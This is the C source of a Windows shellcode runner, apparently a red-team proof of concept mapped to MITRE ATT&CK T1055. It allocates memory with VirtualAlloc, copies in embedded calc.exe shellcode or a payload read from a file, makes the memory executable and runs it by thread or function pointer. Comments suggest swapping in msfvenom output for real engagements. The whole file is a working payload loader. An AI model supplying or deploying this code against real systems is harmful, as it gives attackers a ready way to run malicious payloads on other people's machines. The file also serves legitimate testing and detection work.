/*
 * Shellcode Runner — Execute arbitrary shellcode in local process
 *
 * MITRE ATT&CK: T1055 — Process Injection (self-injection variant)
 * Severity: HIGH
 *
 * Technique:
 *   1. Allocate RWX memory with VirtualAlloc
 *   2. Copy shellcode into allocated region
 *   3. Execute via CreateThread or function pointer cast
 *
 * This is the simplest form of shellcode execution.
 * Use it to test shellcode payloads generated by msfvenom, Donut, etc.
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -o runner.exe shellcode_runner.c
 *   cl shellcode_runner.c /Fe:runner.exe
 *
 * Usage:
 *   runner.exe                         (run embedded calc shellcode)
 *   runner.exe shellcode.bin           (run shellcode from file)
 *   runner.exe shellcode.bin thread    (run via CreateThread)
 */

#include <windows.h>
#include <stdio.h>

// x64 calc.exe shellcode (WinExec method)
// Replace with msfvenom output for real engagements:
//   msfvenom -p windows/x64/exec CMD=calc.exe -f c
unsigned char default_shellcode[] =
    "\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff"
    "\xff\xff\x48\xbb\x4a\x66\x3a\x8a\x1c\xb1\xda\x19\x48\x31\x58"
    "\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xb6\x2e\xb9\x6e\xec\x59"
    "\x1a\x19\x4a\x66\x7b\xd8\x5d\xe1\x88\x48\x1c\x2e\x0b\x58\x79"
    "\xf9\x51\x4b\x2a\x2e\xb1\xd8\x04\xf9\x51\x4b\x6a\x2e\xb1\xf8"
    "\x4c\xf9\xd5\xaf\x00\x2c\x7f\xcb\xd4\xf0\xeb\x19";

int main(int argc, char* argv[]) {
    unsigned char* shellcode = default_shellcode;
    DWORD shellcode_len = sizeof(default_shellcode) - 1;
    int use_thread = 0;

    printf("[*] Shellcode Runner PoC\n\n");

    // Load shellcode from file if specified
    if (argc >= 2) {
        // Check for "thread" flag
        for (int i = 1; i < argc; i++) {
            if (strcmp(argv[i], "thread") == 0) {
                use_thread = 1;
                continue;
            }

            FILE* f = fopen(argv[i], "rb");
            if (!f) {
                printf("[-] Cannot open: %s\n", argv[i]);
                return 1;
            }

            fseek(f, 0, SEEK_END);
            shellcode_len = ftell(f);
            fseek(f, 0, SEEK_SET);

            shellcode = (unsigned char*)malloc(shellcode_len);
            fread(shellcode, 1, shellcode_len, f);
            fclose(f);

            printf("[+] Loaded %lu bytes from %s\n", shellcode_len, argv[i]);
        }
    } else {
        printf("[*] Using embedded calc.exe shellcode (%lu bytes)\n", shellcode_len);
        printf("[*] For custom payload: %s <shellcode.bin>\n", argv[0]);
    }

    // Step 1: Allocate RWX memory
    LPVOID exec_mem = VirtualAlloc(NULL, shellcode_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!exec_mem) {
        printf("[-] VirtualAlloc failed (error %lu)\n", GetLastError());
        return 1;
    }
    printf("[+] Allocated %lu bytes at 0x%p\n", shellcode_len, exec_mem);

    // Step 2: Copy shellcode
    memcpy(exec_mem, shellcode, shellcode_len);

    // Step 3: Change to executable
    DWORD oldProtect;
    VirtualProtect(exec_mem, shellcode_len, PAGE_EXECUTE_READ, &oldProtect);

    // Step 4: Execute
    if (use_thread) {
        // Via CreateThread
        printf("[*] Executing via CreateThread...\n");
        HANDLE hThread = CreateThread(NULL, 0,
            (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
        if (hThread) {
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
        }
    } else {
        // Via function pointer
        printf("[*] Executing via function pointer...\n");
        ((void(*)())exec_mem)();
    }

    VirtualFree(exec_mem, 0, MEM_RELEASE);

    if (shellcode != default_shellcode) {
        free(shellcode);
    }

    return 0;
}
